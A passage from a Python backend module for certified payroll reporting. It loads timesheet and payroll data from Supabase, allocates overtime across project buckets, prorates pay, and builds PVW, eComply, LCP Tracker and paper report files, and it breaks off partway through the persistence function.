"""Certified Payroll — CPR generation: data loading, OT allocation, pay
proration, and the four report file formats (PVW XLSX, eComply 97-column CSV,
per-project LCP Tracker CSV, per-project paper CPR XLSX).

A careful port of the legacy CPR app's CprGenerationService with exactly three
structural changes (the file-format code is byte-for-byte logic-identical):

1. ORM rows became plain dataclasses (EmployeeRec / ProjectRec / …) that keep
   the attribute names the formatters read. Every numeric that arrives from
   PostgREST is coerced through Decimal(str(v)) at load time, so all money math
   stays Decimal end-to-end (ROUND_HALF_UP, two places — see _prorate).
2. Data loading runs on the sync Supabase SDK inside load_report_data() — the
   only report-data query site (plus the cp_settings singleton / signer-profile
   lookups used by paper reports, and persist_record's writes).
3. The merged data model: OT allocation and the pay-proration denominators see
   EVERY time entry with a matched employee, bucketed as
     CP-enrolled project      → str(project_id)
     BDR but not CP-enrolled  → "bdr:{project_id}"        (shift "regular")
     non-payroll registry hit → "ext:{registry_id}"       (registry shift_type)
     unknown                  → "raw:{normalized name}"   (shift "regular")
   All buckets flow through the OT calculator (daily thresholds and the
   chronological split see the whole day) and into the proration denominators;
   only enrolled buckets produce certified report rows. The rest surface as the
   non_cp_hours summary and as NON_CP_HOURS / UNKNOWN_PROJECT flags (see
   services/cpr_flags.py).
"""

import csv
import io
import logging
import zipfile
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import date, datetime, time, timedelta
from decimal import ROUND_HALF_UP, Decimal

from app.core.supabase_client import get_supabase
from app.services import storage
from app.services.cpr_flags import generate_cpr_flags
from app.services.payroll_ot import (
    EmployeeProjectWeekSummary,
    TimeEntryInput,
    calculate_weekly_summaries,
    round_quarter_hour,
)

logger = logging.getLogger(__name__)

ZERO = Decimal("0")
TWO_PLACES = Decimal("0.01")


# ── Record dataclasses (the ORM seam) ─────────────────────────────────────────
# Attribute names match what the legacy formatters read; loaders below map the
# BDR schema onto them (project_number ← projects.number, project_title ←
# projects.name, customer ← cp_details.customer_name, the rest 1:1).


@dataclass
class EmployeeRec:
    id: str
    first_name: str
    last_name: str
    alt_ee_name: str | None = None
    employee_id: str | None = None  # external payroll id (e.g. Gusto)
    ssn_last_four: str | None = None
    personal_email: str | None = None
    jurisdiction: str | None = None
    classification_id: str | None = None

    @property
    def full_name(self) -> str:
        return f"{self.first_name} {self.last_name}"

    @property
    def display_name(self) -> str:
        return self.alt_ee_name or self.full_name


@dataclass
class ProjectRec:
    id: str
    project_number: str | None = None
    project_title: str | None = None
    contract_id: str = ""
    report_type: str | None = None  # "lcp_tracker" | "comply" | "paper"
    shift_type: str = "regular"
    shift_start_time: time | None = None
    pwp_number: str | None = None
    public_body_awarding_contract: str | None = None
    contractor_address_street: str | None = None
    contractor_address_city: str | None = None
    contractor_address_state: str | None = None
    contractor_address_zip: str | None = None
    customer: str | None = None


@dataclass
class ClassificationRec:
    id: str
    code: str = ""
    name: str = ""
    is_field: bool = True
    is_apprentice: bool = False
    apprentice_period: int | None = None


@dataclass
class RateRec:
    hourly_rate: Decimal = ZERO
    overtime_rate: Decimal = ZERO
    doubletime_rate: Decimal = ZERO
    pension: Decimal = ZERO
    health_welfare: Decimal = ZERO
    training: Decimal = ZERO
    other: Decimal = ZERO
    dues: Decimal = ZERO


@dataclass
class TimeEntryRec:
    employee_id: str | None
    project_id: str | None
    raw_project_number: str | None
    raw_project_name: str | None
    work_date: date
    start_time: datetime  # naive local wall-clock on purpose (0064)
    total_hours: Decimal


@dataclass
class DetailRec:
    """One Gusto payroll-detail row (cp_payroll_detail_entries, all columns)."""

    employee_name: str = ""
    employee_id: str | None = None
    pay_date: date | None = None
    time_period: str | None = None
    # Hours
    hours_total: Decimal | None = None
    hours_regular: Decimal | None = None
    hours_grave_shift: Decimal | None = None
    hours_ot: Decimal | None = None
    hours_holiday: Decimal | None = None
    hours_foreman: Decimal | None = None
    hours_gf: Decimal | None = None
    hours_sal: Decimal | None = None
    hours_regular_pay: Decimal | None = None
    hours_overtime_pay: Decimal | None = None
    hours_salary: Decimal | None = None
    hours_holiday_pay: Decimal | None = None
    # Gross pay
    gross_pay_total: Decimal | None = None
    gross_pay_regular: Decimal | None = None
    gross_pay_grave_shift: Decimal | None = None
    gross_pay_ot: Decimal | None = None
    gross_pay_holiday: Decimal | None = None
    gross_pay_foreman: Decimal | None = None
    gross_pay_reimb: Decimal | None = None
    gross_pay_gf: Decimal | None = None
    gross_pay_sal: Decimal | None = None
    gross_pay_regular_pay: Decimal | None = None
    gross_pay_overtime_pay: Decimal | None = None
    gross_pay_reimbursement: Decimal | None = None
    gross_pay_salary: Decimal | None = None
    gross_pay_holiday_pay: Decimal | None = None
    # Pre-tax deductions
    pretax_deductions_total: Decimal | None = None
    pretax_401k: Decimal | None = None
    pretax_401k_catchup: Decimal | None = None
    adjusted_gross: Decimal | None = None
    # Other pay
    other_pay_total: Decimal | None = None
    other_pay_qot: Decimal | None = None
    # Employee taxes
    employee_taxes_total: Decimal | None = None
    employee_taxes_fit: Decimal | None = None
    employee_taxes_ss: Decimal | None = None
    employee_taxes_med: Decimal | None = None
    # After-tax deductions
    aftertax_deductions_total: Decimal | None = None
    aftertax_working_dues: Decimal | None = None
    aftertax_roth_401k: Decimal | None = None
    # Net pay
    net_pay: Decimal | None = None
    # Employer taxes & contributions
    employer_taxes_contributions_total: Decimal | None = None
    employer_taxes_total: Decimal | None = None
    employer_taxes_futa: Decimal | None = None
    employer_taxes_ss: Decimal | None = None
    employer_taxes_med: Decimal | None = None
    employer_taxes_sui: Decimal | None = None
    employer_taxes_cep: Decimal | None = None
    # Company contributions
    company_contributions_total: Decimal | None = None
    company_contributions_pension: Decimal | None = None
    company_contributions_401k: Decimal | None = None
    company_contributions_401k_catchup: Decimal | None = None
    company_contributions_dental_vision: Decimal | None = None
    total_payroll_cost: Decimal | None = None


@dataclass
class ReportRec:
    id: str
    week_start_date: date  # Sunday
    week_end_date: date  # Saturday
    status: str = "draft"
    timesheet_filename: str | None = None
    payroll_detail_filename: str | None = None
    finalized_at: str | None = None


@dataclass
class SettingsRec:
    """cp_settings singleton — the subcontractor identity on every report."""

    name: str | None = None
    street_address: str | None = None
    city: str | None = None
    state: str | None = None
    zip_code: str | None = None
    phone: str | None = None
    license_number: str | None = None


@dataclass
class SignerRec:
    """The generator's cp_signer_profiles row (the caller signs, never a
    stored user)."""

    first_name: str | None = None
    last_name: str | None = None
    job_title: str | None = None
    profile_completed: bool = False


@dataclass
class ReportData:
    """All loaded data needed for CPR generation."""

    report: ReportRec
    time_entries: list[TimeEntryRec] = field(default_factory=list)
    detail_entries: list[DetailRec] = field(default_factory=list)
    # Keyed by employee UUID string
    employees: dict[str, EmployeeRec] = field(default_factory=dict)
    # ENROLLED projects only, keyed by project UUID string (enrolled iff
    # cp_enrolled_at set AND a cp_details row exists)
    projects: dict[str, ProjectRec] = field(default_factory=dict)
    # BDR projects referenced by entries but NOT enrolled: id -> {number, name}
    other_projects: dict[str, dict] = field(default_factory=dict)
    # Keyed by employee UUID string -> ClassificationRec
    classifications: dict[str, ClassificationRec] = field(default_factory=dict)
    # Keyed by classification UUID string -> RateRec
    rates: dict[str, RateRec] = field(default_factory=dict)
    # cp_ignored_projects registry rows (consulted at read time, never stored
    # on entries)
    ignored: list[dict] = field(default_factory=list)


@dataclass
class CprRowData:
    """One row of CPR output = one (employee, enrolled CP project) for the week."""

    employee: EmployeeRec
    project: ProjectRec
    classification: ClassificationRec
    rate: RateRec
    detail: DetailRec
    ot_summary: EmployeeProjectWeekSummary
    # Prorated amounts
    hours_on_project: Decimal = ZERO
    total_hours_all_projects: Decimal = ZERO
    prorate_ratio: Decimal = ZERO
    prorated_gross: Decimal = ZERO
    prorated_fit: Decimal = ZERO
    prorated_ss: Decimal = ZERO
    prorated_med: Decimal = ZERO
    prorated_dues: Decimal = ZERO
    prorated_net: Decimal = ZERO
    prorated_401k: Decimal = ZERO
    payment_date: date | None = None


# ── Coercion helpers (PostgREST → Decimal/date/time) ──────────────────────────


def _dec(v) -> Decimal | None:
    return None if v is None else Decimal(str(v))


def _dec0(v) -> Decimal:
    return ZERO if v is None else Decimal(str(v))


def _to_date(v) -> date | None:
    if v is None or isinstance(v, date):
        return v
    return date.fromisoformat(v)


def _to_datetime(v) -> datetime:
    if isinstance(v, datetime):
        return v
    return datetime.fromisoformat(v)


def _to_time(v) -> time | None:
    if v is None or isinstance(v, time):
        return v
    return time.fromisoformat(v)


_DETAIL_NUMERIC_FIELDS = (
    "hours_total", "hours_regular", "hours_grave_shift", "hours_ot", "hours_holiday",
    "hours_foreman", "hours_gf", "hours_sal", "hours_regular_pay", "hours_overtime_pay",
    "hours_salary", "hours_holiday_pay",
    "gross_pay_total", "gross_pay_regular", "gross_pay_grave_shift", "gross_pay_ot",
    "gross_pay_holiday", "gross_pay_foreman", "gross_pay_reimb", "gross_pay_gf",
    "gross_pay_sal", "gross_pay_regular_pay", "gross_pay_overtime_pay",
    "gross_pay_reimbursement", "gross_pay_salary", "gross_pay_holiday_pay",
    "pretax_deductions_total", "pretax_401k", "pretax_401k_catchup", "adjusted_gross",
    "other_pay_total", "other_pay_qot",
    "employee_taxes_total", "employee_taxes_fit", "employee_taxes_ss", "employee_taxes_med",
    "aftertax_deductions_total", "aftertax_working_dues", "aftertax_roth_401k",
    "net_pay",
    "employer_taxes_contributions_total", "employer_taxes_total", "employer_taxes_futa",
    "employer_taxes_ss", "employer_taxes_med", "employer_taxes_sui", "employer_taxes_cep",
    "company_contributions_total", "company_contributions_pension", "company_contributions_401k",
    "company_contributions_401k_catchup", "company_contributions_dental_vision",
    "total_payroll_cost",
)


def _employee_rec(row: dict) -> EmployeeRec:
    return EmployeeRec(
        id=row["id"],
        first_name=row.get("first_name") or "",
        last_name=row.get("last_name") or "",
        alt_ee_name=row.get("alt_ee_name"),
        employee_id=row.get("employee_id"),
        ssn_last_four=row.get("ssn_last_four"),
        personal_email=row.get("personal_email"),
        jurisdiction=row.get("jurisdiction"),
        classification_id=row.get("classification_id"),
    )


def _project_rec(row: dict, details: dict) -> ProjectRec:
    return ProjectRec(
        id=row["id"],
        project_number=row.get("number"),
        project_title=row.get("name"),
        contract_id=details.get("contract_id") or "",
        report_type=details.get("report_type"),
        shift_type=details.get("shift_type") or "regular",
        shift_start_time=_to_time(details.get("shift_start_time")),
        pwp_number=details.get("pwp_number"),
        public_body_awarding_contract=details.get("public_body_awarding_contract"),
        contractor_address_street=details.get("contractor_address_street"),
        contractor_address_city=details.get("contractor_address_city"),
        contractor_address_state=details.get("contractor_address_state"),
        contractor_address_zip=details.get("contractor_address_zip"),
        customer=details.get("customer_name"),
    )


def _classification_rec(row: dict) -> ClassificationRec:
    return ClassificationRec(
        id=row["id"],
        code=row.get("code") or "",
        name=row.get("name") or "",
        is_field=bool(row.get("is_field", True)),
        is_apprentice=bool(row.get("is_apprentice", False)),
        apprentice_period=row.get("apprentice_period"),
    )


def _rate_rec(row: dict) -> RateRec:
    return RateRec(
        hourly_rate=_dec0(row.get("hourly_rate")),
        overtime_rate=_dec0(row.get("overtime_rate")),
        doubletime_rate=_dec0(row.get("doubletime_rate")),
        pension=_dec0(row.get("pension")),
        health_welfare=_dec0(row.get("health_welfare")),
        training=_dec0(row.get("training")),
        other=_dec0(row.get("other")),
        dues=_dec0(row.get("dues")),
    )


def _entry_rec(row: dict) -> TimeEntryRec:
    return TimeEntryRec(
        employee_id=row.get("employee_id"),
        project_id=row.get("project_id"),
        raw_project_number=row.get("raw_project_number"),
        raw_project_name=row.get("raw_project_name"),
        work_date=_to_date(row["work_date"]),
        start_time=_to_datetime(row["start_time"]),
        total_hours=_dec0(row.get("total_hours")),
    )


def _detail_rec(row: dict) -> DetailRec:
    numerics = {f: _dec(row.get(f)) for f in _DETAIL_NUMERIC_FIELDS}
    return DetailRec(
        employee_name=row.get("employee_name") or "",
        employee_id=row.get("employee_id"),
        pay_date=_to_date(row.get("pay_date")),
        time_period=row.get("time_period"),
        **numerics,
    )


def _report_rec(row: dict) -> ReportRec:
    return ReportRec(
        id=row["id"],
        week_start_date=_to_date(row["week_start_date"]),
        week_end_date=_to_date(row["week_end_date"]),
        status=row.get("status") or "draft",
        timesheet_filename=row.get("timesheet_filename"),
        payroll_detail_filename=row.get("payroll_detail_filename"),
        finalized_at=row.get("finalized_at"),
    )


# ── Data loading (the only report-data query site) ────────────────────────────


def load_report_data(report_id: str) -> ReportData:
    """Load everything CPR generation needs (6 queries + the registry)."""
    sb = get_supabase()

    rows = (sb.table("cp_payroll_reports").select("*").eq("id", report_id).execute()).data or []
    if not rows:
        raise ValueError("Payroll report not found")
    report = _report_rec(rows[0])
    if not report.timesheet_filename:
        raise ValueError("Timesheet has not been uploaded")
    if not report.payroll_detail_filename:
        raise ValueError("Payroll detail has not been uploaded")

    entry_rows = (
        sb.table("cp_time_entries").select("*").eq("payroll_report_id", report_id).execute()
    ).data or []
    detail_rows = (
        sb.table("cp_payroll_detail_entries")
        .select("*")
        .eq("payroll_report_id", report_id)
        .execute()
    ).data or []
    time_entries = [_entry_rec(r) for r in entry_rows]
    detail_entries = [_detail_rec(r) for r in detail_rows]

    employees: dict[str, EmployeeRec] = {}
    emp_ids = sorted({e.employee_id for e in time_entries if e.employee_id})
    if emp_ids:
        emp_rows = (sb.table("employees").select("*").in_("id", emp_ids).execute()).data or []
        employees = {r["id"]: _employee_rec(r) for r in emp_rows}

    # One query for every referenced project; enrollment (cp_enrolled_at AND a
    # cp_details row) decides which side of the merged model it lands on.
    projects: dict[str, ProjectRec] = {}
    other_projects: dict[str, dict] = {}
    proj_ids = sorted({e.project_id for e in time_entries if e.project_id})
    if proj_ids:
        proj_rows = (
            sb.table("projects")
            .select("id, number, name, cp_enrolled_at, cp_details(*)")
            .in_("id", proj_ids)
            .execute()
        ).data or []
        for r in proj_rows:
            details = r.get("cp_details")
            if isinstance(details, list):
                details = details[0] if details else None
            if r.get("cp_enrolled_at") and details:
                projects[r["id"]] = _project_rec(r, details)
            else:
                other_projects[r["id"]] = {"number": r.get("number"), "name": r.get("name")}

    # All classifications with their 1:1 rate embed (small reference table).
    classifications: dict[str, ClassificationRec] = {}
    rates: dict[str, RateRec] = {}
    cls_rows = (sb.table("cp_classifications").select("*, cp_rates(*)").execute()).data or []
    cls_by_id: dict[str, ClassificationRec] = {}
    for r in cls_rows:
        cls_by_id[r["id"]] = _classification_rec(r)
        rate = r.get("cp_rates")
        if isinstance(rate, list):
            rate = rate[0] if rate else None
        if rate:
            rates[r["id"]] = _rate_rec(rate)
    for emp_id, emp in employees.items():
        if emp.classification_id and emp.classification_id in cls_by_id:
            classifications[emp_id] = cls_by_id[emp.classification_id]

    # Local import: payroll_matching is a sibling seam module (built in
    # parallel); the registry is only needed here and in _calculate_ot.
    from app.services import payroll_matching

    return ReportData(
        report=report,
        time_entries=time_entries,
        detail_entries=detail_entries,
        employees=employees,
        projects=projects,
        other_projects=other_projects,
        classifications=classifications,
        rates=rates,
        ignored=payroll_matching.load_ignored_projects(),
    )


def load_org_settings() -> SettingsRec | None:
    rows = (get_supabase().table("cp_settings").select("*").limit(1).execute()).data or []
    if not rows:
        return None
    r = rows[0]
    return SettingsRec(
        name=r.get("name"),
        street_address=r.get("street_address"),
        city=r.get("city"),
        state=r.get("state"),
        zip_code=r.get("zip_code"),
        phone=r.get("phone"),
        license_number=r.get("license_number"),
    )


def load_signer(actor_id: str) -> SignerRec | None:
    rows = (
        get_supabase()
        .table("cp_signer_profiles")
        .select("*")
        .eq("profile_id", actor_id)
        .limit(1)
        .execute()
    ).data or []
    if not rows:
        return None
    r = rows[0]
    return SignerRec(
        first_name=r.get("first_name"),
        last_name=r.get("last_name"),
        job_title=r.get("job_title"),
        profile_completed=bool(r.get("profile_completed")),
    )


# ── OT allocation over the merged buckets ─────────────────────────────────────


def _calculate_ot(data: ReportData) -> tuple[list[EmployeeProjectWeekSummary], dict[str, str]]:
    """Run the OT calculator on EVERY entry with a matched employee.

    Returns the weekly summaries plus a map of non-enrolled bucket key →
    human-readable source name (for flags and the non_cp_hours summary).
    """
    from app.services import payroll_matching  # sibling seam module (see above)

    inputs: list[TimeEntryInput] = []
    sources: dict[str, str] = {}

    for entry in data.time_entries:
        if not entry.employee_id:
            continue

        pid = entry.project_id
        shift_start: time | None = None
        if pid and pid in data.projects:
            project = data.projects[pid]
            key = pid
            shift_type = project.shift_type or "regular"
            shift_start = project.shift_start_time
        elif pid:
            key = f"bdr:{pid}"
            shift_type = "regular"
            other = data.other_projects.get(pid) or {}
            label = " - ".join(p for p in (other.get("number"), other.get("name")) if p)
            sources.setdefault(
                key, label or entry.raw_project_name or entry.raw_project_number or "BDR project"
            )
        else:
            hit = payroll_matching.match_ignored(
                entry.raw_project_number, entry.raw_project_name, data.ignored
            )
            if hit:
                key = f"ext:{hit['id']}"
                shift_type = hit.get("shift_type") or "regular"
                sources.setdefault(
                    key, hit.get("raw_name") or entry.raw_project_name or "non-payroll"
                )
            else:
                raw = entry.raw_project_number or entry.raw_project_name
                key = f"raw:{payroll_matching.normalize_key(raw)}"
                shift_type = "regular"
                sources.setdefault(
                    key,
                    entry.raw_project_name or entry.raw_project_number or "unknown project",
                )

        inputs.append(
            TimeEntryInput(
                employee_id=entry.employee_id,
                project_id=key,
                work_date=entry.work_date,
                start_time=entry.start_time,
                total_hours=entry.total_hours,
                shift_type=shift_type,
                shift_start_time=shift_start,
            )
        )

    return calculate_weekly_summaries(inputs, data.report.week_start_date), sources


def _non_cp_summary(
    data: ReportData,
    ot_summaries: list[EmployeeProjectWeekSummary],
    bucket_sources: dict[str, str],
) -> list[dict]:
    """Per-employee non-CP hours: counted for OT and proration, never reported."""
    per_emp: dict[str, dict] = {}
    for s in ot_summaries:
        if s.project_id in data.projects:
            continue
        hours = s.total_hours
        if hours <= ZERO:
            continue
        employee = data.employees.get(s.employee_id)
        name = employee.full_name if employee else s.employee_id
        rec = per_emp.setdefault(
            s.employee_id,
            {"employee_id": s.employee_id, "employee_name": name, "hours": ZERO, "sources": []},
        )
        rec["hours"] += hours
        source = bucket_sources.get(s.project_id, s.project_id)
        if source not in rec["sources"]:
            rec["sources"].append(source)
    out = sorted(per_emp.values(), key=lambda r: r["employee_name"])
    for rec in out:
        rec["hours"] = str(rec["hours"])
    return out


# ── Row building (certified rows come from enrolled buckets only) ─────────────


def _build_row_data(
    data: ReportData,
    ot_summaries: list[EmployeeProjectWeekSummary],
) -> list[CprRowData]:
    """Build one CprRowData per (employee, enrolled CP project)."""
    # Index OT summaries by (employee_id, bucket key)
    ot_by_key: dict[tuple[str, str], EmployeeProjectWeekSummary] = {}
    for s in ot_summaries:
        ot_by_key[(s.employee_id, s.project_id)] = s

    # Total hours per employee across ALL buckets — non-CP hours stay in the
    # proration denominator (the merged-model rule).
    emp_total_hours: dict[str, Decimal] = {}
    for s in ot_summaries:
        emp_total_hours[s.employee_id] = emp_total_hours.get(s.employee_id, ZERO) + s.total_hours

    # Index detail entries by employee_id
    detail_by_emp: dict[str, DetailRec] = {}
    for d in data.detail_entries:
        if d.employee_id:
            detail_by_emp[d.employee_id] = d

    rows: list[CprRowData] = []

    # Track skip reasons for diagnostics
    skipped_non_cp: int = 0
    skipped_no_employee: int = 0
    skipped_no_classification: set = set()
    skipped_not_field: set = set()
    skipped_no_rate: set = set()
    skipped_no_detail: set = set()

    for (emp_id, proj_id), summary in ot_by_key.items():
        project = data.projects.get(proj_id)
        if not project:
            # bdr:/ext:/raw: buckets (and any stray non-enrolled id) — counted
            # above, never reported.
            skipped_non_cp += 1
            continue

        employee = data.employees.get(emp_id)
        if not employee:
            skipped_no_employee += 1
            continue

        emp_name = f"{employee.first_name} {employee.last_name}"

        classification = data.classifications.get(emp_id)
        if not classification:
            skipped_no_classification.add(emp_name)
            continue

        if not classification.is_field:
            skipped_not_field.add(emp_name)
            continue

        rate = data.rates.get(classification.id)
        if not rate:
            skipped_no_rate.add(f"{emp_name} ({classification.name})")
            continue

        detail = detail_by_emp.get(emp_id)
        if not detail:
            skipped_no_detail.add(emp_name)
            continue

        hours_on_project = summary.total_hours
        total_hours = emp_total_hours.get(emp_id, ZERO)

        if total_hours > 0:
            prorate_ratio = (hours_on_project / total_hours).quantize(
                TWO_PLACES, rounding=ROUND_HALF_UP
            )
        else:
            prorate_ratio = ZERO

        # Determine payment date
        payment_date = detail.pay_date
        if not payment_date:
            # Wednesday after week_end = week_end + 4 days (Sat + 4 = Wed)
            payment_date = data.report.week_end_date + timedelta(days=4)

        row = CprRowData(
            employee=employee,
            project=project,
            classification=classification,
            rate=rate,
            detail=detail,
            ot_summary=summary,
            hours_on_project=hours_on_project,
            total_hours_all_projects=total_hours,
            prorate_ratio=prorate_ratio,
            prorated_gross=_prorate(detail.gross_pay_total, hours_on_project, total_hours),
            prorated_fit=_prorate(detail.employee_taxes_fit, hours_on_project, total_hours),
            prorated_ss=_prorate(detail.employee_taxes_ss, hours_on_project, total_hours),
            prorated_med=_prorate(detail.employee_taxes_med, hours_on_project, total_hours),
            prorated_dues=_prorate(detail.aftertax_working_dues, hours_on_project, total_hours),
            prorated_net=_prorate(detail.net_pay, hours_on_project, total_hours),
            prorated_401k=_prorate(detail.pretax_401k, hours_on_project, total_hours),
            payment_date=payment_date,
        )
        rows.append(row)

    # If no rows were generated, log diagnostics and raise a helpful error
    if not rows:
        reasons = []
        if skipped_no_classification:
            names = ", ".join(sorted(skipped_no_classification))
            reasons.append(f"Missing classification: {names}")
        if skipped_no_rate:
            names = ", ".join(sorted(skipped_no_rate))
            reasons.append(f"Missing prevailing wage rate: {names}")
        if skipped_no_detail:
            names = ", ".join(sorted(skipped_no_detail))
            reasons.append(f"Missing payroll detail entry: {names}")
        if skipped_not_field:
            names = ", ".join(sorted(skipped_not_field))
            reasons.append(f"Classification not marked as field: {names}")
        if skipped_non_cp == len(ot_by_key) and len(ot_by_key) > 0:
            reasons.append("No hours matched a Certified Payroll project this week")
        if not ot_by_key:
            reasons.append("No time entries found in this report")

        if reasons:
            detail = "; ".join(reasons)
            logger.warning(
                "CPR generation produced 0 rows: %s (total_summaries=%d, skipped_non_cp=%d)",
                detail, len(ot_by_key), skipped_non_cp,
            )
            raise ValueError(f"Could not generate certified payroll. {detail}")
        else:
            logger.warning(
                "CPR generation produced 0 rows with no specific reason "
                "(total_summaries=%d, skipped_non_cp=%d, skipped_no_employee=%d)",
                len(ot_by_key), skipped_non_cp, skipped_no_employee,
            )

    # Sort by employee name, then project number
    rows.sort(
        key=lambda r: (r.employee.last_name, r.employee.first_name, r.project.project_number or "")
    )
    return rows


# ── Generation orchestration ──────────────────────────────────────────────────


def generate_all(
    report_id: str,
    actor_id: str,
    paper_reports: list | None = None,
    file_type: str = "all",
) -> tuple[dict[str, io.BytesIO], list[dict], list[dict], dict[str, set[str]]]:
    """Generate CPR files for a report.

    Args:
        actor_id: The generating user — their signer profile is printed on
                  paper reports.
        paper_reports: CpPaperReportInput list; required when paper-type
                       projects are in scope.
        file_type: Which files to generate — "all", "pvw_sheet", "ecomply_csv",
                   "lcp_csv", or "paper_xlsx".

    Returns (files dict mapping filename -> BytesIO, flags list, non_cp_hours
    summary, file_projects dict mapping filename -> the set of project UUID
    strings that file covers — aggregate files span every project on the
    report, per-project files exactly one). Raises ValueError for every
    caller-fixable precondition (the router maps those to 400s).
    """
    report_data = load_report_data(report_id)
    ot_summaries, bucket_sources = _calculate_ot(report_data)
    rows = _build_row_data(report_data, ot_summaries)

    flags = generate_cpr_flags(report_data, ot_summaries, rows, bucket_sources)
    non_cp_hours = _non_cp_summary(report_data, ot_summaries, bucket_sources)

    files: dict[str, io.BytesIO] = {}
    # filename -> project ids covered, keyed identically to `files`
    file_projects: dict[str, set[str]] = {}

    # PVW Sheet (requires openpyxl — only import when needed)
    if file_type in ("all", "pvw_sheet") and rows:
        files["PVW Sheet Old School.xlsx"] = _generate_pvw_sheet(rows, report_data)
        file_projects["PVW Sheet Old School.xlsx"] = {str(r.project.id) for r in rows}

    # eComply CSV
    if file_type in ("all", "ecomply_csv"):
        comply_rows = [r for r in rows if r.project.report_type == "comply"]
        if comply_rows:
            files["eComply CPR Upload.csv"] = _generate_csv(comply_rows, report_data, "comply")
            file_projects["eComply CPR Upload.csv"] = {str(r.project.id) for r in comply_rows}

    # LCP Tracker CSV — one file per project
    if file_type in ("all", "lcp_csv"):
        lcp_rows = [r for r in rows if r.project.report_type == "lcp_tracker"]
        if lcp_rows:
            lcp_by_project: dict[str, list[CprRowData]] = defaultdict(list)
            for r in lcp_rows:
                key = r.project.project_number or "unknown"
                lcp_by_project[key].append(r)
            logger.info(
                "LCP split: %d total rows -> %d projects: %s",
                len(lcp_rows),
                len(lcp_by_project),
                {k: len(v) for k, v in lcp_by_project.items()},
            )
            for proj_num, proj_rows_list in sorted(lcp_by_project.items()):
                proj_rows_list.sort(key=lambda r: (r.employee.last_name, r.employee.first_name))
                filename = f"{proj_num} LCP CPR Upload.csv"
                files[filename] = _generate_csv(proj_rows_list, report_data, "lcp_tracker")
                # Grouped by project_number (unique per project) — capture the
                # actual project id(s) from the group's rows.
                file_projects[filename] = {str(r.project.id) for r in proj_rows_list}

    # Paper CPR XLSX (replaces the legacy PDF template approach)
    if file_type in ("all", "paper_xlsx"):
        paper_rows = [r for r in rows if r.project.report_type == "paper"]
        if paper_rows:
            # Both are hard requirements now (legacy silently skipped): a paper
            # CPR without a signer or its report metadata is invalid.
            signer = load_signer(actor_id)
            if not signer or not (
                signer.first_name and signer.last_name and signer.job_title
            ):
                raise ValueError("Complete your signer profile before generating paper reports")

            paper_meta = {str(pr.project_id): pr for pr in (paper_reports or [])}
            missing = sorted(
                {
                    r.project.project_number or str(r.project.id)
                    for r in paper_rows
                    if str(r.project.id) not in paper_meta
                }
            )
            if missing:
                raise ValueError(
                    "Paper report details are required for: " + ", ".join(missing)
                )

            org_settings = load_org_settings()

            paper_by_project: dict[str, list[CprRowData]] = defaultdict(list)
            for r in paper_rows:
                paper_by_project[str(r.project.id)].append(r)

            for proj_id, proj_rows_list in paper_by_project.items():
                proj_rows_list.sort(key=lambda r: (r.employee.last_name, r.employee.first_name))
                meta = paper_meta.get(proj_id)
                proj_num = proj_rows_list[0].project.project_number or "unknown"
                filename = f"{proj_num} Paper CPR.xlsx"
                file_projects[filename] = {proj_id}  # group key is str(project.id)
                files[filename] = _generate_paper_xlsx(
                    proj_rows_list, report_data,
                    report_number=meta.report_number if meta else "",
                    report_type_label="Regular Weekly"
                    if meta and meta.report_type == "regular_weekly"
                    else "Final" if meta else "",
                    notes=meta.notes if meta else None,
                    org_settings=org_settings,
                    user_profile=signer,
                )

    logger.info(
        "CPR files generated report_id=%s type=%s files=%s rows=%d flags=%d by user=%s",
        report_id, file_type, list(files.keys()), len(rows), len(flags), actor_id,
    )
    return files, flags, non_cp_hours, file_projects


def get_paper_report_data(report_id: str, paper_reports: list, actor_id: str) -> list[dict]:
    """Return structured paper report data as dicts (for the JSON preview)."""
    report_data = load_report_data(report_id)
    ot_summaries, _ = _calculate_ot(report_data)
    rows = _build_row_data(report_data, ot_summaries)

    paper_rows = [r for r in rows if r.project.report_type == "paper"]
    if not paper_rows:
        return []

    paper_by_project: dict[str, list[CprRowData]] = defaultdict(list)
    for r in paper_rows:
        paper_by_project[str(r.project.id)].append(r)

    paper_meta = {str(pr.project_id): pr for pr in paper_reports}

    org_settings = load_org_settings()
    user_profile = load_signer(actor_id)

    result = []
    for proj_id, proj_rows_list in paper_by_project.items():
        proj_rows_list.sort(key=lambda r: (r.employee.last_name, r.employee.first_name))
        meta = paper_meta.get(proj_id)
        result.append(_serialize_paper_report(
            proj_rows_list, report_data,
            report_number=meta.report_number if meta else "",
            report_type_label="Regular Weekly"
            if meta and meta.report_type == "regular_weekly"
            else "Final" if meta else "",
            notes=meta.notes if meta else None,
            org_settings=org_settings,
            user_profile=user_profile,
        ))
    return result


# ── Revision numbering + persistence ──────────────────────────────────────────


def revision_prefix(revision_number: int) -> str:
    """Return the filename prefix for a given revision number."""
    if revision_number == 0:
        return ""
    elif revision_number == 1:
        return "Revised "
    else:
        return f"Revised {revision_number} "


def _content_type_for_filename(filename: str) -> str:
    """Determine MIME type from filename."""
    if filename.endswith(".xlsx"):
        return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    elif filename.endswith(".csv"):
        return "text/csv"
    elif filename.endswith(".pdf"):
        return "application/pdf"
    return "application/octet-stream"


def persist_record(
    report_id: str,
    files: dict[str, io.BytesIO],
    flags: list[dict],
    paper_metadata: list[dict] | None,
    actor_id: str,
    file_projects: dict[str, set[str]] | None = None,
) -> dict:
    """Upload the generated files and record the generation event.

    revision_number = count of existing cp_records for the report; the
    "Revised N " prefix is applied to the stored filenames. file_projects maps
    each ORIGINAL filename (the `files` key, pre-prefix) to the project UUIDs
    it covers; the mapping is written to cp_record_file_projects so the
    project-documents hub can surface a file under every project it pertains
    to. On any failure the uploaded objects and the record row are removed
    best-effort, then the original error re-raises — no half-persisted
    revision survives (cp_record_file_projects rows cascade with the files).
    """
    sb = get_supabase()
    existing = (
        sb.table("cp_records").select("id").eq("payroll_report_id", report_id).execute()
    ).data or []
    revision_number = len(existing)
    prefix = revision_prefix(revision_number)

    record = (
        sb.table("cp_records")
        .insert(
            {
                "payroll_report_id": report_id,
                "revision_number": revision_number,
                "paper_metadata": paper_metadata,
                "flags": flags,
                "created_by": actor_id,
            }
        )
        .execute()
    ).data[0]
    record_id = record["id"]

    uploaded: list[str] = []
    try:
        file_rows = []
        for original_name, content_io in files.items():
            filename = f"{prefix}{original_name}"
            content = content_io.getvalue()
            content_type = _content_type_for_filename(filename)
            path = storage.build_object_path(
                "payroll", f"reports/{report_id}/cpr/{record_id}", filename
            )
            storage.upload_file(path, content, content_type)
            uploaded.append(path)
